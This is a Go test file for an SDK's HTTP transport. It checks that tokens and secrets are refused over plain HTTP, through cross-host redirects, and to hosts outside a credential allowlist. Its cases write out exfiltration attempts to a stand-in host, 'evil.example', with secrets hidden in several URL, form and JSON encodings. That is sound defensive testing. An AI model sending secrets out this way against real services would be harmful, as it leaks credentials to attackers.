package componentsdk

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"reflect"
	"strings"
	"sync"
	"testing"
	"testing/synctest"
	"unicode/utf16"
)

func TestTransportKeepsCredentialsOffPlainHTTP(t *testing.T) {
	synctest.Test(t, func(t *testing.T) {
		script := newScript().
			on("api.example.com/start", respond(302, "", http.Header{"Location": []string{"http://api.example.com/next"}})).
			on("api.example.com/next", respond(200, "{}", nil)).
			on("api.example.com/plain", respond(200, "{}", nil)).
			on("127.0.0.1:8080/local", respond(200, "{}", nil)).
			on("[::1]:8080/local", respond(200, "{}", nil)).
			on("localhost:8080/local", respond(200, "{}", nil))
		c := testContext(script)
		listed := NewHTTPClient(c, HTTPOptions{CredentialHosts: []string{"api.example.com"}})
		unlisted := NewHTTPClient(c, HTTPOptions{})
		send := func(client *http.Client, url string, credential bool) error {
			req, err := http.NewRequest(http.MethodGet, url, nil)
			if err != nil {
				t.Fatal(err)
			}
			if credential {
				req.Header.Set("PRIVATE-TOKEN", "glpat-secret-value")
			}
			resp, err := client.Do(req)
			if err == nil {
				_ = resp.Body.Close()
			}
			return err
		}

		var refused *RefusedHostError
		err := send(listed, "https://api.example.com/start", true)
		if !errors.As(err, &refused) || !refused.Plaintext || refused.Host != "api.example.com" {
			t.Fatalf("redirect to plain http: err = %v, want a plaintext refusal", err)
		}
		if !strings.Contains(err.Error(), "over plain http") || Classify(err) != CodeInvalidResponse {
			t.Errorf("err = %v classifies as %s", err, Classify(err))
		}
		for _, r := range script.requests() {
			if r.URL.Path == "/next" {
				t.Fatal("the token went to http://api.example.com/next")
			}
		}
		if err := send(unlisted, "http://api.example.com/plain", true); !errors.As(err, &refused) || !refused.Plaintext {
			t.Errorf("plain http with no host list: err = %v, want a plaintext refusal", err)
		}
		for _, url := range []string{"http://127.0.0.1:8080/local", "http://[::1]:8080/local", "http://localhost:8080/local"} {
			if err := send(unlisted, url, true); err != nil {
				t.Errorf("%s: %v, want loopback allowed", url, err)
			}
		}
		if err := send(unlisted, "http://api.example.com/plain", false); err != nil {
			t.Errorf("a request without credentials may use plain http: %v", err)
		}
	})
}

func TestTransportKeepsCredentialsOnTheirHosts(t *testing.T) {
	synctest.Test(t, func(t *testing.T) {
		script := newScript().
			on("api.example.com/start", respond(302, "", http.Header{"Location": []string{"https://evil.example/steal"}})).
			on("evil.example/steal", respond(200, "{}", nil)).
			on("cdn.example.net/file", respond(200, "{}", nil))
		c := testContext(script)
		client := NewHTTPClient(c, HTTPOptions{CredentialHosts: []string{"api.example.com", "*.example.org"}})

		req, _ := http.NewRequest(http.MethodGet, "https://api.example.com/start", nil)
		req.Header.Set("PRIVATE-TOKEN", "glpat-secret-value")
		_, err := client.Do(req)
		var refused *RefusedHostError
		if !errors.As(err, &refused) || refused.Host != "evil.example" {
			t.Fatalf("redirect err = %v, want a refusal for evil.example", err)
		}
		for _, r := range script.requests() {
			if r.URL.Host == "evil.example" {
				t.Fatal("the token reached evil.example")
			}
		}

		req, _ = http.NewRequest(http.MethodGet, "https://cdn.example.net/file", nil)
		req.Header.Set("Authorization", "Bearer token")
		if _, err := client.Do(req); !errors.As(err, &refused) {
			t.Fatalf("next-page err = %v, want a refusal", err)
		}

		req, _ = http.NewRequest(http.MethodGet, "https://cdn.example.net/file", nil)
		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("a request without credentials may go anywhere: %v", err)
		}
		_ = resp.Body.Close()

		if !newHostSet([]string{"*.example.org"}).allows("api.example.org") {
			t.Error("*.example.org should match api.example.org")
		}
	})
}

func TestRunInProcessListsEachClientsCredentialHosts(t *testing.T) {
	handler := func(ctx CollectorContext) error {
		NewHTTPClient(ctx, HTTPOptions{CredentialHosts: []string{"api.example.com"}})
		NewTransport(ctx, HTTPOptions{CredentialHosts: []string{"*.example.org", "login.example.org"}})
		NewHTTPClient(ctx, HTTPOptions{CredentialHosts: []string{"api.example.com"}})
		NewHTTPClient(ctx, HTTPOptions{})
		return ctx.Emit([]CollectedArtifact{{Data: map[string]any{}, Path: "artifacts/demo.json"}})
	}
	res := RunInProcess(CollectorSpec{Name: "demo"}, handler, InProcessOptions{})
	want := [][]string{{"api.example.com"}, {"*.example.org", "login.example.org"}, {}}
	if !reflect.DeepEqual(res.CredentialHosts, want) {
		t.Errorf("CredentialHosts = %q, want each distinct list once, in order", res.CredentialHosts)
	}
}

// base64Secret holds the +, /, and = that form and query encoding escape.
// passwordSecret holds the quote, backslash, <, >, &, and non-ASCII
// characters that JSON encoders escape.
const (
	base64Secret   = "s3cr3t+value/123456=="
	passwordSecret = "p<a&s>\"w\\ord-é🔑"
)

// jsonBody returns a JSON object that holds value under key. It uses Go's
// encoder, with or without HTML escapes.
func jsonBody(key, value string, escapeHTML bool) string {
	var b bytes.Buffer
	enc := json.NewEncoder(&b)
	enc.SetEscapeHTML(escapeHTML)
	_ = enc.Encode(map[string]string{key: value})
	return strings.TrimSpace(b.String())
}

// asciiJSON escapes each character of s other than an ASCII letter or digit
// as \uXXXX in lowercase hex. An encoder that keeps its output ASCII may
// write JSON this way.
func asciiJSON(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' {
			b.WriteRune(r)
			continue
		}
		for _, unit := range utf16.Encode([]rune{r}) {
			fmt.Fprintf(&b, `\u%04x`, unit)
		}
	}
	return b.String()
}

func TestTransportKeepsSecretsOffUnlistedHosts(t *testing.T) {
	const secret = base64Secret
	lowercase := strings.NewReplacer("+", "%2b", "/", "%2f", "=", "%3d")
	cases := []struct {
		name    string
		url     string
		body    string
		refused bool
	}{
		{"a secret in the body to an unlisted host", "https://evil.example/token", "client_secret=" + secret, true},
		{"a secret in the URL to an unlisted host", "https://evil.example/token?key=" + secret, "", true},
		{"a form-encoded secret in the body", "https://evil.example/token", url.Values{"client_secret": {secret}}.Encode(), true},
		{"a query-escaped secret in the URL", "https://evil.example/token?key=" + url.QueryEscape(secret), "", true},
		{"a path-escaped secret in the URL", "https://evil.example/keys/" + url.PathEscape(secret), "", true},
		{"a secret escaped in lowercase hex", "https://evil.example/token", "client_secret=" + lowercase.Replace(secret), true},
		{"an encoded secret after a stray percent", "https://evil.example/token", "note=100%&client_secret=" + url.QueryEscape(secret), true},
		{"a JSON-escaped secret in the body", "https://evil.example/token", jsonBody("password", passwordSecret, true), true},
		{"a secret in JSON without HTML escapes", "https://evil.example/token", jsonBody("password", passwordSecret, false), true},
		{"a secret in ASCII-only JSON", "https://evil.example/token", `{"password":"` + asciiJSON(passwordSecret) + `"}`, true},
		{"JSON in a form field", "https://evil.example/token", url.Values{"assertion": {jsonBody("password", passwordSecret, true)}}.Encode(), true},
		{"JSON in the URL", "https://evil.example/token?filter=" + url.QueryEscape(jsonBody("password", passwordSecret, true)), "", true},
		{"no secret to an unlisted host", "https://evil.example/token", "grant_type=client_credentials", false},
		{"a secret in the body to a listed host", "https://login.example.com/token", "client_secret=" + secret, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			synctest.Test(t, func(t *testing.T) {
				var mu sync.Mutex
				var seen []string
				base := roundTripFunc(func(req *http.Request) (*http.Response, error) {
					b := ""
					if req.Body != nil {
						raw, _ := io.ReadAll(req.Body)
						b = string(raw)
					}
					mu.Lock()
					seen = append(seen, b)
					mu.Unlock()
					return respond(200, "{}", nil)(req)
				})
				c := testContext(base)
				c.run.secrets.add(base64Secret)
				c.run.secrets.add(passwordSecret)
				client := NewHTTPClient(c, HTTPOptions{CredentialHosts: []string{"login.example.com"}})
				req, err := http.NewRequest(http.MethodPost, tc.url, strings.NewReader(tc.body))
				if err != nil {
					t.Fatal(err)
				}
				resp, err := client.Do(req)
				var refused *RefusedHostError
				if got := errors.As(err, &refused); got != tc.refused {
					t.Fatalf("refused = %v (err %v), want %v", got, err, tc.refused)
				}
				if err == nil {
					_ = resp.Body.Close()
					if len(seen) != 1 || seen[0] != tc.body {
						t.Errorf("the vendor saw %q, want the body intact", seen)
					}
				} else if len(seen) != 0 {
					t.Errorf("a refused request reached the vendor: %q", seen)
				}
			})
		})
	}
}

func TestTransportRefusesARedirectThatCarriesAnEncodedSecret(t *testing.T) {
	cases := []struct {
		name, contentType, body string
	}{
		{"a form", "application/x-www-form-urlencoded", url.Values{"grant_type": {"client_credentials"}, "client_secret": {base64Secret}}.Encode()},
		{"JSON", "application/json", jsonBody("password", passwordSecret, true)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			script := newScript().
				on("login.example.com/token", respond(http.StatusTemporaryRedirect, "", http.Header{"Location": []string{"https://evil.example/token"}})).
				on("evil.example/token", respond(200, "{}", nil))
			c := testContext(script)
			c.run.secrets.add(base64Secret)
			c.run.secrets.add(passwordSecret)
			client := NewHTTPClient(c, HTTPOptions{CredentialHosts: []string{"login.example.com"}})
			req, err := http.NewRequest(http.MethodPost, "https://login.example.com/token", strings.NewReader(tc.body))
			if err != nil {
				t.Fatal(err)
			}
			req.Header.Set("Content-Type", tc.contentType)
			resp, err := client.Do(req)
			if err == nil {
				_ = resp.Body.Close()
			}
			var refused *RefusedHostError
			if !errors.As(err, &refused) || refused.Host != "evil.example" {
				t.Fatalf("err = %v, want a refusal of evil.example", err)
			}
			for _, r := range script.requests() {
				if r.URL.Host == "evil.example" {
					t.Errorf("the redirect reached %s", r.URL)
				}
			}
		})
	}
}

func TestUnescapeJSONLoosely(t *testing.T) {
	cases := map[string]string{
		`a\"b\\c\/d`:         `a"b\c/d`,
		`\u003C\u003e\u0026`: "<>&",
		`\ud83d\udd11`:       "🔑",
		`\\u003c`:            `\u003c`,
		`\u12 \x \`:          `\u12 \x \`,
		`\n\t\r\b\f`:         "\n\t\r\b\f",
		`lone \ud83d high`:   "lone \uFFFD high",
		`no escapes at all`:  "no escapes at all",
	}
	for in, want := range cases {
		if got := unescapeJSONLoosely(in); got != want {
			t.Errorf("unescapeJSONLoosely(%q) = %q, want %q", in, got, want)
		}
	}
}
